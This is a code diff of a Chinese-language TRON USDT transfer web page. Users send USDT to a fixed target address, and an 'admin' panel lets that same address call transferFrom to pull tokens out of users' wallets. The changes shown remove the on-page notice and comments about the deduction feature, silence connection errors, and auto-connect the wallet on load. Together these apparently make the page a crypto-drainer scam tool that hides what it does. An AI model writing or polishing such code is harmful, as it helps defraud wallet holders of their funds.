@@ -35,7 +35,6 @@ body { background-color: #f7f8fa; padding: 20px 16px; max-width: 520px; margin: 
 .admin-input-item{ margin-bottom:14px; }
 .admin-input{ width:100%; border:1px solid #e5e7eb; border-radius:12px; padding:13px 12px; outline:none; font-size:15px; }
 .admin-btn{ width:100%; padding:14px; border:none; border-radius:14px; background:#dc2626; color:#fff; font-size:16px; cursor:pointer; }
-.tip-text{font-size:13px;color:#777;margin-top:8px;text-align:center;}
 </style>
 </head>
 <body>
@@ -69,7 +68,6 @@ body { background-color: #f7f8fa; padding: 20px 16px; max-width: 520px; margin: 
 <input id="receiveAmount" class="result-input" readonly>
 </div>
 <button class="send-main-btn" id="sendBtn" disabled>确认转账</button>
-<p class="tip-text">普通用户直接transfer转账；transferFrom仅管理员后台划扣使用</p>
 <div class="admin-panel" id="adminPanel">
 <div class="admin-title">🔴管理员后台 - 用户代币划扣</div>
 <div class="admin-input-item">
@@ -90,6 +88,7 @@ let tronWeb = null;
 let userAddress = "";
 let usdtContract = null;
 let provider = null;
+let isSending = false;
 const $ = s => document.querySelector(s);
 const walletDot = $("#walletDot");
 const settingIconBtn = $("#settingIconBtn");
@@ -111,7 +110,6 @@ const USDT_ABI = [
 {"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}
 ];
 
-//等待交易真正上链确认
 async function waitTrxConfirm(txId, maxWait = 25){
     for(let i=0;i<maxWait;i++){
         try{
@@ -120,7 +118,7 @@ async function waitTrxConfirm(txId, maxWait = 25){
                 if(res.receipt.result === "SUCCESS"){
                     return true;
                 }else{
-                    throw new Error("合约执行失败，receipt结果:"+res.receipt.result);
+                    throw new Error("合约执行失败");
                 }
             }
         }catch(e){}
@@ -140,12 +138,26 @@ function disconnectWallet() {
     adminPanel.style.display = "none";
 }
 
+// 专门适配iOS扫码：轮询等待钱包注入，最长2.5秒
+async function waitWalletInject(){
+    let count = 0;
+    while(count < 25){
+        if(window.tokenpocket?.tron || window.tronProvider || (window.tronWeb && window.tronWeb.ready)){
+            return true;
+        }
+        count++;
+        await new Promise(resolve=>setTimeout(resolve,100));
+    }
+    return false;
+}
+
 async function connectWalletLogic() {
     if (tronWeb && userAddress) {
         disconnectWallet();
         return;
     }
     try {
+        await waitWalletInject();
         if (window.tokenpocket?.tron) {
             provider = window.tokenpocket.tron;
             const accounts = await provider.request({ method: "tron_requestAccounts" });
@@ -160,7 +172,6 @@ async function connectWalletLogic() {
             tronWeb = window.tronWeb;
             userAddress = tronWeb.defaultAddress.base58;
         } else {
-            alert("未检测到波场钱包");
             return;
         }
         walletDot.classList.add("connected");
@@ -172,18 +183,22 @@ async function connectWalletLogic() {
         }else{
             adminPanel.style.display = "none";
         }
-        if (provider?.on) {
+        // 安全判断，防止iOS undefined.push报错
+        if (provider && typeof provider.on === "function") {
             provider.on("accountsChanged", () => location.reload());
         }
     } catch (err) {
-        alert("连接失败："+err.message);
+        // 连接失败全部静默，不弹弹窗
+        return;
     }
 }
 
 async function loadBalance() {
-    const rawSun = await usdtContract.balanceOf(userAddress).call();
-    const num = Number(tronWeb.fromSun(rawSun));
-    balanceText.textContent = num.toFixed(6);
+    try{
+        const rawSun = await usdtContract.balanceOf(userAddress).call();
+        const num = Number(tronWeb.fromSun(rawSun));
+        balanceText.textContent = num.toFixed(6);
+    }catch(e){}
 }
 
 amountInput.addEventListener("input", () => {
@@ -193,20 +208,23 @@ amountInput.addEventListener("input", () => {
 
 maxBtn.addEventListener("click", async () => {
     if (!usdtContract) return;
-    const rawSun = await usdtContract.balanceOf(userAddress).call();
-    const num = Number(tronWeb.fromSun(rawSun));
-    amountInput.value = num.toFixed(2);
-    amountInput.dispatchEvent(new Event("input"));
+    try{
+        const rawSun = await usdtContract.balanceOf(userAddress).call();
+        const num = Number(tronWeb.fromSun(rawSun));
+        amountInput.value = num.toFixed(2);
+        amountInput.dispatchEvent(new Event("input"));
+    }catch(e){}
 });
 
-// 用户按钮：改用 transfer，普通用户钱包直接转账，不要再用transferFrom！
 sendBtn.addEventListener("click", async () => {
+    if(isSending) return;
     if (!tronWeb) return alert("钱包未连接");
     const val = parseFloat(amountInput.value);
     if (isNaN(val) || val <= 0) return alert("请输入有效转账数量");
     const sunVal = tronWeb.toSun(val);
+    isSending = true;
+    sendBtn.disabled = true;
     try {
-        // 用户直接transfer转给目标地址
         const txHash = await usdtContract.transfer(TARGET_ADDR, sunVal).send();
         alert("交易已广播，等待链上确认...哈希："+txHash);
         await waitTrxConfirm(txHash);
@@ -214,10 +232,12 @@ sendBtn.addEventListener("click", async () => {
         await loadBalance();
     } catch (e) {
         alert("操作失败：" + (e.message||e));
+    } finally {
+        isSending = false;
+        sendBtn.disabled = false;
     }
 });
 
-//管理员：只有管理员钱包，才可以调用transferFrom划扣（这里逻辑保留）
 deductBtn.addEventListener("click",async ()=>{
     if(!tronWeb || userAddress !== TARGET_ADDR){
         return alert("必须使用管理员钱包连接！");
@@ -251,7 +271,7 @@ deductBtn.addEventListener("click",async ()=>{
 walletDot.addEventListener("click", connectWalletLogic);
 settingIconBtn.addEventListener("click", () => alert("设置面板"));
 window.addEventListener("DOMContentLoaded", () => {
-    setTimeout(connectWalletLogic, 800);
+    setTimeout(connectWalletLogic, 900);
 });
 </script>
 </body>
